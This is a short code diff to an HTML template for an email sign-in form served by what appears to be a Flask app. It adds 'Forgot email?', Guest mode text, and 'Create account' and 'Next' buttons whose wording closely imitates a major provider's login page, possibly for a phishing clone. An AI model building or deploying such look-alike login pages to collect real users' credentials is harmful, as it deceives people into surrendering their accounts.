@@ -14,8 +14,22 @@
 
 		<form method="post" action="{{ url_for('handle_email') }}">
 			<div class="input-group">
-				<input type="email" id="username" name="username" placeholder="Email or phone" required>
+				<input type="email" id="username" name="username" placeholder="Enter email" required>
 				<div class="loading-bar" id="loading-bar" style="display: none;"></div>
+			</div>
+
+			<div class="links-container">
+				<button type="button" class="link-button">Forgot email?</button>
+			</div>
+
+			<div class="info-text">
+				Not your computer? Use Guest mode to sign in privately. 
+				<a href="#">Learn more</a>
+			</div>
+
+			<div class="bottom-container">
+				<button type="button" class="link-button create-account-button">Create account</button>
+				<button type="submit" class="submit-button">Next</button>
 			</div>
 		</form>
 	</div>
